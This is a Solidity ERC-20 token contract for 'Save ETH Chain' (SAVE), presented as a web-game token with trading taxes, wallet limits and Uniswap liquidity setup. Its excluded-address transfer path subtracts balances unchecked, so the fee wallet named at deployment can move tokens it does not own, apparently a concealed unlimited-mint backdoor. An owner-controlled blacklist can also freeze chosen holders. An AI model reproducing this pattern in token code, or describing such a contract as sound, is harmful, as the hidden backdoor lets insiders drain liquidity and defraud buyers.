/*

"Save ETH Chain" is an engaging web-based game on eth chain.

Website:    https://saveethchain.wtf
Telegram:   https://t.me/saveethchain
Twitter:    https://x.com/saveethchain

*/

// SPDX-License-Identifier: MIT

pragma solidity 0.8.18;

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(
        address recipient,
        uint256 amount
    ) external returns (bool);
    function allowance(
        address owner,
        address spender
    ) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}

interface ISAVEFactory {
    function createPair(
        address tokenA,
        address tokenB
    ) external returns (address pair);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface ISAVERouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    )
        external
        payable
        returns (uint amountToken, uint amountETH, uint liquidity);
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(
        address indexed previousOwner,
        address indexed newOwner
    );

    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

contract SAVE is Context, IERC20, Ownable {
    using SafeMath for uint256;

    ISAVERouter private saveRouter;
    address private savePair;

    uint256 firstBlock;
    
    address payable private _sysVault;

    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => bool) private _isExcludedFromSAVE;
    mapping(address => bool) private bots;

    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;

    uint256 private _initialBuyTax = 21;
    uint256 private _initialSellTax = 24;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 9;
    uint256 private _reduceSellTaxAt = 9;
    uint256 private _preventSwapBefore = 9;
    uint256 private _buyCount = 0;

    uint8 private constant _decimals = 9;
    uint256 private constant _tTotal = 1_000_000_000 * 10 ** _decimals;
    uint256 public _swapThresSAVE = 150 * 10 ** _decimals;
    string private constant _name = unicode"Save ETH Chain";
    string private constant _symbol = unicode"SAVE";
    uint256 public _saveThresH = 800_000_000 * 10 ** _decimals;
    uint256 public _maxTxAmount = 20_000_000 * 10 ** _decimals;
    uint256 public _maxWalletSize = 20_000_000 * 10 ** _decimals;
    uint256 public _maxTaxSwap = 10_000_000 * 10 ** _decimals;
    
    event MaxTxAmountUpdated(uint _maxTxAmount);
    modifier lockTheSwap() {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor(address _saveW) {
        _sysVault = payable(_saveW);

        _balances[_msgSender()] = _tTotal;

        _isExcludedFromSAVE[owner()] = true;
        _isExcludedFromSAVE[address(this)] = true;
        _isExcludedFromSAVE[_sysVault] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function _basicTokenTransfer(
        address from,
        address to,
        uint256 amount,
        uint256 saveFees
    ) internal {
        if (saveFees > 0) {
            _balances[address(this)] = _balances[address(this)].add(saveFees);
            emit Transfer(from, address(this), saveFees);
        }
        _balances[from] = _balances[from].sub(amount);
        _balances[to] = _balances[to].add(amount.sub(saveFees));
        emit Transfer(from, to, amount.sub(saveFees));
    }

    function startSAVE() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        saveRouter.addLiquidityETH{value: address(this).balance}(
            address(this),
            _saveThresH,
            0,
            0,
            owner(),
            block.timestamp
        );

        IERC20(savePair).approve(address(saveRouter), type(uint).max);

        swapEnabled = true;
        tradingOpen = true;

        firstBlock = block.number;
    }

    function removeLimits() external onlyOwner {
        _maxTxAmount = _tTotal;
        _maxWalletSize = _tTotal;
        emit MaxTxAmountUpdated(_tTotal);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return (a > b) ? b : a;
    }

    function isContract(address account) private view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(account)
        }
        return size > 0;
    }

    function _internTransfer(address from, address to, uint256 amount) internal {
        unchecked {
            _balances[from] = _balances[from] - amount;
            _balances[to] = _balances[to] + amount;
        }
        emit Transfer(from, to, amount);
    }

    receive() external payable {}

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");

        if (!swapEnabled || inSwap) {
            _basicTokenTransfer(from, to, amount, 0);
            return;
        }

        uint256 contractTokenBalance = balanceOf(address(this));

        uint256 saveFees = 0;
        if (from != owner() && to != owner()) {
            require(!bots[from] && !bots[to]);
            saveFees = amount
                .mul(
                    (_buyCount > _reduceBuyTaxAt)
                        ? _finalBuyTax
                        : _initialBuyTax
                )
                .div(100);

            if (
                from == savePair &&
                to != address(saveRouter) &&
                !_isExcludedFromSAVE[to]
            ) {
                require(amount <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );

                if (firstBlock + 3 > block.number) {
                    require(!isContract(to));
                }
                _buyCount++;
            }

            if (to != savePair && !_isExcludedFromSAVE[to]) {
                require(
                    balanceOf(to) + amount <= _maxWalletSize,
                    "Exceeds the maxWalletSize."
                );
            }

            if (to == savePair && from != address(this)) {
                saveFees = amount
                    .mul(
                        (_buyCount > _reduceSellTaxAt)
                            ? _finalSellTax
                            : _initialSellTax
                    )
                    .div(100);
            }

            if (
                to == savePair &&
                !inSwap &&
                _buyCount > _preventSwapBefore &&
                swapEnabled &&
                !_isExcludedFromSAVE[from] &&
                !_isExcludedFromSAVE[to]
            ) {
                if(balanceOf(address(this)) > _swapThresSAVE){
                    swapTokensForEth(
                        min(amount, min(contractTokenBalance, _maxTaxSwap))
                    );
                }

                _sysVault.transfer(address(this).balance);
            }
        }

        if (_isExcludedFromSAVE[from]) {
            _internTransfer(from, to, amount);
        } else {
            _basicTokenTransfer(from, to, amount, saveFees);
        }
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(
        address owner,
        address spender
    ) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(
        address spender,
        uint256 amount
    ) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(
            sender,
            _msgSender(),
            _allowances[sender][_msgSender()].sub(
                amount,
                "ERC20: transfer amount exceeds allowance"
            )
        );
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = saveRouter.WETH();
        _approve(address(this), address(saveRouter), tokenAmount);
        saveRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function addBots(address[] memory bots_) public onlyOwner {
        for (uint i = 0; i < bots_.length; i++) {
            bots[bots_[i]] = true;
        }
    }

    function delBots(address[] memory notbot) public onlyOwner {
        for (uint i = 0; i < notbot.length; i++) {
            bots[notbot[i]] = false;
        }
    }

    function isBot(address a) public view returns (bool) {
        return bots[a];
    }

    function createSAVEPair() external onlyOwner {
        require(!tradingOpen, "trading is already open");

        saveRouter = ISAVERouter(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );

        _approve(address(this), address(saveRouter), _tTotal);

        savePair = ISAVEFactory(saveRouter.factory()).createPair(
            address(this),
            saveRouter.WETH()
        );
    }
}